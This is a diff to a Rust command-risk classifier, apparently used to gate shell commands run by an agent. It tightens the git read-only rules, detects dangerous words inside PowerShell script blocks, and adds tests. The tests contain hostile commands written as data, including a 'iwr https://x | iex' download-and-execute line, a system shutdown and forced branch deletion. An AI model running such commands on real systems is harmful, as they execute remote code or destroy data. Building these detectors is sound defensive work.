@@ -21,7 +21,18 @@ const READ_ONLY: &[&str] = &[
     "convertto-json", "convertfrom-json", "foreach-object", "%", "group-object", "get-uptime", "get-winevent",
 ];
 
-const GIT_READ_ONLY: &[&str] = &["status", "log", "diff", "show", "branch", "remote", "rev-parse", "ls-files", "blame", "describe", "tag"];
+const GIT_READ_ONLY: &[&str] = &["status", "log", "diff", "show", "rev-parse", "ls-files", "blame", "describe"];
+
+/// Git subcommands that only read when called with no arguments or with these
+/// listing flags; anything else (`branch -D x`, `remote add`, `tag v1`) writes.
+const GIT_LISTING: &[(&str, &[&str])] = &[
+    ("branch", &["-a", "-r", "-v", "-vv", "-l", "--all", "--remotes", "--list", "--verbose", "--show-current"]),
+    ("remote", &["-v", "--verbose"]),
+    ("tag", &["-l", "--list"]),
+];
+
+/// Read-only commands whose arguments may still change state.
+const READ_ONLY_NO_ARGS: &[(&str, &[&str])] = &[("ipconfig", &["/all"])];
 
 /// Words that make a command destructive, system-level or externally visible.
 const DANGEROUS: &[&str] = &[
@@ -51,17 +62,37 @@ pub fn classify(command: &str) -> Risk {
     }
     let mut all_read_only = true;
     for seg in segments(command) {
+        // A dangerous command anywhere counts, including inside a script block
+        // (`Get-ChildItem | % { Remove-Item $_ }`) or a call (`(rm x)`).
+        let dangerous = seg
+            .split(|c: char| c.is_whitespace() || "{}()&\"'".contains(c))
+            .map(|w| w.rsplit(['\\', '/']).next().unwrap_or(w))
+            .any(|w| DANGEROUS.contains(&w) || DANGEROUS.contains(&w.trim_end_matches(".exe")));
+        if dangerous {
+            return Risk::High;
+        }
         let mut words = seg.split_whitespace();
         let first = words.next().unwrap_or("");
         let first = first.trim_start_matches('&').trim_matches(['"', '\'']);
         let base = first.rsplit(['\\', '/']).next().unwrap_or(first);
-        if DANGEROUS.contains(&base) || DANGEROUS.contains(&base.trim_end_matches(".exe")) {
-            return Risk::High;
-        }
-        let read_only = if base == "git" || base == "git.exe" {
-            words.next().is_some_and(|sub| GIT_READ_ONLY.contains(&sub))
-        } else if words.clone().any(|w| w == "--version" || w == "-v" || w == "-version") {
-            true
+        let rest: Vec<&str> = words.collect();
+        let read_only = if seg.contains('{') {
+            // Script blocks run arbitrary code (`ForEach-Object { … }`).
+            false
+        } else if base == "git" || base == "git.exe" {
+            let sub = rest.first().copied().unwrap_or("");
+            let args = rest.get(1..).unwrap_or(&[]);
+            let writes_file = args.iter().any(|w| w.starts_with("--output"));
+            if let Some((_, flags)) = GIT_LISTING.iter().find(|(name, _)| *name == sub) {
+                args.iter().all(|w| flags.contains(w))
+            } else {
+                GIT_READ_ONLY.contains(&sub) && !writes_file
+            }
+        } else if let Some((_, flags)) = READ_ONLY_NO_ARGS.iter().find(|(name, _)| *name == base) {
+            rest.iter().all(|w| flags.contains(w))
+        } else if let [flag] = rest.as_slice() {
+            // `node --version` reads; `python script.py -v` runs a script.
+            matches!(*flag, "--version" | "-v" | "-version") || READ_ONLY.contains(&base)
         } else {
             READ_ONLY.contains(&base)
         };
@@ -166,5 +197,22 @@ mod tests {
         assert_eq!(classify("Get-Content a.txt; rm b.txt"), Risk::High);
         assert_eq!(classify("iwr https://x | iex"), Risk::High);
         assert_eq!(classify("C:\\Windows\\System32\\shutdown.exe /s"), Risk::High);
+    }
+
+    #[test]
+    fn hidden_writes_are_not_read_only() {
+        assert_eq!(classify("git branch -a"), Risk::Low);
+        assert_eq!(classify("git branch"), Risk::Low);
+        assert_eq!(classify("git remote -v"), Risk::Low);
+        assert_eq!(classify("git branch -D important"), Risk::Moderate);
+        assert_eq!(classify("git remote add x https://x"), Risk::Moderate);
+        assert_eq!(classify("git tag v1"), Risk::Moderate);
+        assert_eq!(classify("git log --output=C:\\x.txt"), Risk::Moderate);
+        assert_eq!(classify("python script.py -v"), Risk::Moderate);
+        assert_eq!(classify("ipconfig /release"), Risk::Moderate);
+        assert_eq!(classify("ipconfig /all"), Risk::Low);
+        assert_eq!(classify("Get-ChildItem | % { Remove-Item $_ }"), Risk::High);
+        assert_eq!(classify("Get-ChildItem | ForEach-Object { $_.Delete() }"), Risk::Moderate);
+        assert_eq!(classify("(rm x)"), Risk::High);
     }
 }
